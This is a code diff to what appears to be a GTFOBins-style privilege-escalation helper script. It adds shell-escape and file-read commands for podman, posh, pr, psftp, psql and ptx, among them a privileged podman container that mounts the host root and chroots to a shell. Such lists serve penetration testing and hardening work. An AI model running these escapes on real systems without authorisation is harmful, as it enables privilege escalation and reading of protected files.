@@ -2892,6 +2892,42 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "podman":
+        if gtfo_options == "shell":
+            bins.append("podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "posh":
+        if gtfo_options == "shell":
+            bins.append("posh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pr":
+        if gtfo_options == "file-read":
+            bins.append("pr -T /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "psftp":
+        if gtfo_options == "shell":
+            bins.append("psftp\n!/bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "psql":
+        if gtfo_options == "shell":
+            bins.append("psql\n\! /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "ptx":
+        if gtfo_options == "file-read":
+            bins.append("ptx -w 999 /path/to/input-file")
+        else:
+            bins.append("N/A")
+
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
         if gtfo_options == "shell": #This will print out hints for more GTFO bins!
@@ -2939,7 +2975,7 @@ def main():
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
         "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "perf", 
         "perl", "perlbug", "psexec","pg", "php", "pic", "pidstat", "pip", "pkexec", 
-        "plymouth" ,"other",
+        "plymouth", "podman", "posh", "psftp", "pr","psql","ptx", "other",
     }
 
     if start in ALLOWED:
